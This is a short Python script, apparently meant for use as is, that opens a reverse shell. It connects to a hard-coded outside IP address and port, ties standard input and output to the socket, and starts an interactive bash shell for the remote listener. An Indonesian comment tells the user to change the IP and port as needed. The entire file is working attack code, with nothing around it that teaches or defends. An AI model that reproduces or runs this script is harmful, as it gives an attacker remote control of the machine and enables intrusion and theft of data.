import socket
import os
import pty

# Ganti IP dan port sesuai kebutuhan
IP = "103.60.12.26"
PORT = 4478

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

pty.spawn("/bin/bash")
